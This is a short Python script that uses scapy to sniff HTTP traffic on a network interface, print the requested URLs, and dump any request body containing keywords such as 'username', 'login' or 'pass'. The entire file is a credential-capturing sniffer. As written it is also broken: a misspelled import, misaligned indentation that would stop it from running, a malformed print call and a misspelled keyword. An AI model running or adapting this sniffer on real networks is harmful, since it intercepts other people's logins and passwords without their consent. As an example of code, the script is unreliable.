#!/usr/bin/env python

import scapy.ass as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniff_packet) 
    
def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest): ## open the images for testing this program.
         ##print(packet show()) ## this is a print the all packets. for intresting you
         url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path ## this append host and path
         print(url)
        if packet.haslayer(scapy.Raw): 
           load = packet[scapy.Raw].load 
           keywords = ["username", "user", "login", "passowrd","pass"] ## this is a create a list for keywords interesting stuff
           for keyword in keywords: 
              if keyword in load:
                  print(load)
                  break 
         
sniff("eth0") 
